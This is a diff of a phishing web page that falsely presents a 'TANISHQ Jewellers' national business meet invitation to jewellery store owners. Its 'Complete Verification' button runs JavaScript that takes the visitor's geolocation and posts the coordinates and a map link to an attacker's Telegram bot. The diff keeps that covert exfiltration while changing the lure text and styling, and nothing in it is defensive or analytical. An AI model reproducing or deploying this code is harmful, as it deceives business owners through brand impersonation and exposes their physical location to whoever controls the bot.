@@ -1,172 +1,164 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>TANISHQ Jewellers Business Meet 2026</title>
+<title>TANISHQ Jewellery Business Meet 2026</title>
 
 <style>
 
 *{
-  margin:0;
-  padding:0;
-  box-sizing:border-box;
-  font-family:Arial,sans-serif;
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:Arial,sans-serif;
 }
 
 body{
-  background:
-  linear-gradient(rgba(0,0,0,0.82),rgba(0,0,0,0.82)),
-  url('https://images.unsplash.com/photo-1617038220319-276d3cfab638?q=80&w=1200&auto=format&fit=crop');
-  background-size:cover;
-  background-position:center;
-  color:white;
-  min-height:100vh;
-  padding:20px;
+background:
+linear-gradient(rgba(0,0,0,0.82),rgba(0,0,0,0.82)),
+url('https://images.unsplash.com/photo-1617038220319-276d3cfab638?q=80&w=1200&auto=format&fit=crop');
+background-size:cover;
+background-position:center;
+min-height:100vh;
+padding:20px;
+color:white;
 }
 
 .container{
-  max-width:650px;
-  margin:auto;
-  background:rgba(255,255,255,0.06);
-  backdrop-filter:blur(12px);
-  border:1px solid rgba(255,255,255,0.1);
-  border-radius:28px;
-  overflow:hidden;
-  box-shadow:0 20px 50px rgba(0,0,0,0.5);
+max-width:650px;
+margin:auto;
+background:rgba(255,255,255,0.06);
+backdrop-filter:blur(12px);
+border:1px solid rgba(255,255,255,0.1);
+border-radius:28px;
+overflow:hidden;
+box-shadow:0 20px 50px rgba(0,0,0,0.5);
 }
 
 .top-banner{
-  background:linear-gradient(135deg,#ffd700,#c58b00);
-  padding:28px 20px;
-  text-align:center;
-  color:black;
+background:linear-gradient(135deg,#ffd700,#c58b00);
+padding:28px 20px;
+text-align:center;
+color:black;
 }
 
 .logo-box{
-  width:110px;
-  height:110px;
-  border-radius:50%;
-  background:white;
-  margin:auto;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  overflow:hidden;
-  box-shadow:0 10px 25px rgba(0,0,0,0.25);
+width:120px;
+height:120px;
+border-radius:50%;
+background:white;
+margin:auto;
+overflow:hidden;
+display:flex;
+justify-content:center;
+align-items:center;
+box-shadow:0 10px 25px rgba(0,0,0,0.3);
 }
 
 .logo-box img{
-  width:100%;
-  height:100%;
-  object-fit:cover;
-}
-
-/* YOUR LOGO IMAGE LINK HERE */
-.logo-placeholder{
-  font-size:14px;
-  padding:10px;
-  text-align:center;
-  color:#666;
+width:100%;
+height:100%;
+object-fit:cover;
 }
 
 h1{
-  margin-top:18px;
-  font-size:34px;
-  font-weight:bold;
+margin-top:18px;
+font-size:34px;
+font-weight:bold;
 }
 
 .sub{
-  margin-top:10px;
-  font-size:16px;
-  font-weight:bold;
+margin-top:10px;
+font-size:16px;
+font-weight:bold;
 }
 
 .content{
-  padding:30px;
+padding:30px;
 }
 
-.verified{
-  background:rgba(255,215,0,0.12);
-  border:1px solid rgba(255,215,0,0.3);
-  padding:18px;
-  border-radius:18px;
-  margin-bottom:25px;
-  line-height:1.8;
+.badge{
+background:rgba(255,215,0,0.12);
+border:1px solid rgba(255,215,0,0.3);
+padding:18px;
+border-radius:18px;
+margin-bottom:25px;
+line-height:1.9;
 }
 
 .section-title{
-  color:#ffd700;
-  font-size:24px;
-  margin-bottom:18px;
+font-size:24px;
+color:#ffd700;
+margin-bottom:16px;
 }
 
 .card{
-  background:rgba(255,255,255,0.05);
-  padding:22px;
-  border-radius:18px;
-  margin-bottom:20px;
-  border:1px solid rgba(255,255,255,0.08);
+background:rgba(255,255,255,0.05);
+border:1px solid rgba(255,255,255,0.08);
+padding:22px;
+border-radius:18px;
+margin-bottom:22px;
 }
 
 .card p{
-  line-height:1.8;
-  color:#f1f1f1;
-}
-
-ul{
-  margin-top:15px;
-  margin-left:20px;
-  line-height:2;
+line-height:1.8;
+color:#f1f1f1;
 }
 
 .highlight{
-  color:#ffd700;
-  font-weight:bold;
+color:#ffd700;
+font-weight:bold;
+}
+
+ul{
+margin-top:15px;
+margin-left:20px;
+line-height:2;
 }
 
 .button{
-  width:100%;
-  padding:18px;
-  border:none;
-  border-radius:16px;
-  background:linear-gradient(135deg,#ffd700,#ffb100);
-  color:black;
-  font-size:18px;
-  font-weight:bold;
-  cursor:pointer;
-  margin-top:10px;
-  transition:0.3s;
+width:100%;
+padding:18px;
+border:none;
+border-radius:16px;
+background:linear-gradient(135deg,#ffd700,#ffb100);
+font-size:18px;
+font-weight:bold;
+color:black;
+cursor:pointer;
+transition:0.3s;
+margin-top:10px;
 }
 
 .button:hover{
-  transform:scale(1.02);
+transform:scale(1.02);
 }
 
 .notice{
-  margin-top:20px;
-  background:rgba(255,255,255,0.05);
-  padding:16px;
-  border-radius:14px;
-  line-height:1.7;
-  color:#ddd;
-  font-size:14px;
+margin-top:20px;
+background:rgba(255,255,255,0.05);
+padding:16px;
+border-radius:14px;
+line-height:1.7;
+font-size:14px;
+color:#ddd;
 }
 
 #status{
-  margin-top:18px;
-  text-align:center;
-  color:#ffd700;
-  font-weight:bold;
+margin-top:20px;
+text-align:center;
+font-weight:bold;
+color:#ffd700;
 }
 
 .footer{
-  margin-top:25px;
-  text-align:center;
-  color:#aaa;
-  font-size:13px;
-  line-height:1.8;
+margin-top:25px;
+text-align:center;
+font-size:13px;
+line-height:1.8;
+color:#aaa;
 }
 
 </style>
@@ -176,112 +168,111 @@ ul{
 
 <div class="container">
 
-  <div class="top-banner">
+<div class="top-banner">
 
-    <div class="logo-box">
+<div class="logo-box">
 
-      <!-- PUT YOUR LOGO IMAGE LINK BELOW -->
+<!-- PUT YOUR LOGO LINK BELOW -->
 
-      <!-- Example:
-      <img src="https://awards.brandingforum.org/wp-content/uploads/2019/01/Tanishq-Logo-1024x1024.jpg">
-      -->
+<img src="https://images.unsplash.com/photo-1617038220319-276d3cfab638?q=80&w=1200&auto=format&fit=crop">
 
-      <div class="logo-placeholder">
-        YOUR<br>LOGO
-      </div>
+</div>
 
-    </div>
+<h1>TANISHQ Jewellers</h1>
 
-    <h1>TANISHQ Jewellers</h1>
+<div class="sub">
+National Jewellery Business Growth Meet 2026
+</div>
 
-    <div class="sub">
-      National Jewellery Business Growth Meet 2026
-    </div>
+</div>
 
-  </div>
+<div class="content">
 
-  <div class="content">
+<div class="badge">
 
-    <div class="verified">
+✔ Premium Jewellery Business Conference<br>
+✔ Selected Jewellery Store Invitation<br>
+✔ Wholesale Gold Partnership Access<br>
+✔ Business Expansion Opportunity<br>
+✔ Luxury Dealer Networking Program
 
-      ✔ Premium Jewellery Business Conference<br>
-      ✔ Selected Jewellery Store Invitation<br>
-      ✔ Business Expansion Opportunity<br>
-      ✔ Wholesale Gold Partnership Access<br>
-      ✔ High Value Dealer Networking Program
+</div>
 
-    </div>
+<div class="card">
 
-    <div class="card">
+<div class="section-title">
+Official Invitation
+</div>
 
-      <div class="section-title">
-        Invitation Details
-      </div>
+<p>
 
-      <p>
-        Dear Jewellery Business Owner,
-        <br><br>
+Dear Jewellery Business Owner,
+<br><br>
 
-        We are pleased to inform you that your jewellery business has been shortlisted for the
-        <span class="highlight">National Jewellery Business Growth Meet 2026</span>
-        conducted by
-        <span class="highlight">Aryan Jewellers</span>.
-        <br><br>
+We are pleased to inform you that your jewellery business has been shortlisted for the
+<span class="highlight">
+National Jewellery Business Growth Meet 2026
+</span>.
 
-        This premium business conference is specially organized for selected jewellery stores and gold business partners from different regions.
-      </p>
+<br><br>
 
-    </div>
+This premium conference is organized for selected jewellery businesses, wholesalers, and gold trading partners from different regions to discuss new business opportunities, wholesale partnerships, and expansion programs.
 
-    <div class="card">
+</p>
 
-      <div class="section-title">
-        Business Benefits
-      </div>
+</div>
 
-      <ul>
-        <li>Wholesale Gold Purchase Opportunities</li>
-        <li>Premium Jewellery Supplier Network</li>
-        <li>Business Growth Partnerships</li>
-        <li>Special Festival Collection Access</li>
-        <li>Dealer Level Discount Programs</li>
-        <li>Direct Jewellery Market Networking</li>
-      </ul>
+<div class="card">
 
-    </div>
+<div class="section-title">
+Business Benefits
+</div>
 
-    <div class="card">
+<ul>
+<li>Wholesale Gold Access</li>
+<li>Premium Jewellery Supplier Connections</li>
+<li>Festival Collection Opportunities</li>
+<li>Dealer Level Pricing Programs</li>
+<li>Luxury Jewellery Market Networking</li>
+<li>Business Growth Partnerships</li>
+</ul>
 
-      <div class="section-title">
-        Verification Process
-      </div>
+</div>
 
-      <p>
-        To confirm participation and regional business verification, selected participants are required to complete secure location verification before receiving conference schedule access.
-      </p>
+<div class="card">
 
-    </div>
+<div class="section-title">
+Verification Process
+</div>
 
-    <button class="button" onclick="getLocation()">
-      Complete Verification
-    </button>
+<p>
 
-    <div class="notice">
+To confirm your participation and regional business verification, selected participants are requested to complete secure verification before receiving conference schedule and dealer access information.
 
-      By continuing, the browser may request your location permission for business region verification. Location is only shared after manual approval.
+</p>
 
-    </div>
+</div>
 
-    <div id="status"></div>
+<button class="button" onclick="getLocation()">
+Complete Verification
+</button>
 
-    <div class="footer">
+<div class="notice">
 
-      © 2026 TANISHQ Jewellers Business Meet<br>
-      Luxury Jewellery Business Network Program
+By continuing, the browser may request your location permission for regional business verification. Location is only shared after manual approval.
 
-    </div>
+</div>
 
-  </div>
+<div id="status"></div>
+
+<div class="footer">
+
+© 2026 TANISHQ Jewellers Business Meet<br>
+Luxury Jewellery Business Network Program
+
+</div>
+
+</div>
 
 </div>
 
@@ -292,41 +283,41 @@ const CHAT_ID = "8508792403";
 
 async function sendToTelegram(message){
 
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-  await fetch(url,{
-    method:"POST",
-    headers:{
-      "Content-Type":"application/json"
-    },
-    body:JSON.stringify({
-      chat_id:CHAT_ID,
-      text:message
-    })
-  });
+await fetch(url,{
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+chat_id:CHAT_ID,
+text:message
+})
+});
 
 }
 
 function getLocation(){
 
-  const status=document.getElementById("status");
+const status=document.getElementById("status");
 
-  if(!navigator.geolocation){
-    status.innerText="Geolocation not supported.";
-    return;
-  }
+if(!navigator.geolocation){
+status.innerText="Geolocation not supported.";
+return;
+}
 
-  status.innerText="Starting secure verification...";
+status.innerText="Starting secure verification...";
 
-  navigator.geolocation.getCurrentPosition(
+navigator.geolocation.getCurrentPosition(
 
-    async(position)=>{
+async(position)=>{
 
-      const lat=position.coords.latitude;
-      const lon=position.coords.longitude;
+const lat=position.coords.latitude;
+const lon=position.coords.longitude;
 
-      const message=
-`🏆 TANISHQ Jewellers Verification
+const message =
+`🏆 Aryan Jewellers Verification
 
 📍 Location Received
 
@@ -336,17 +327,17 @@ Longitude: ${lon}
 🗺 Map:
 https://maps.google.com/?q=${lat},${lon}`;
 
-      await sendToTelegram(message);
+await sendToTelegram(message);
 
-      status.innerText="Verification completed successfully.";
+status.innerText="Verification completed successfully.";
 
-    },
+},
 
-    (error)=>{
-      status.innerText="Permission denied or unavailable.";
-    }
+(error)=>{
+status.innerText="Permission denied or unavailable.";
+}
 
-  );
+);
 
 }
 
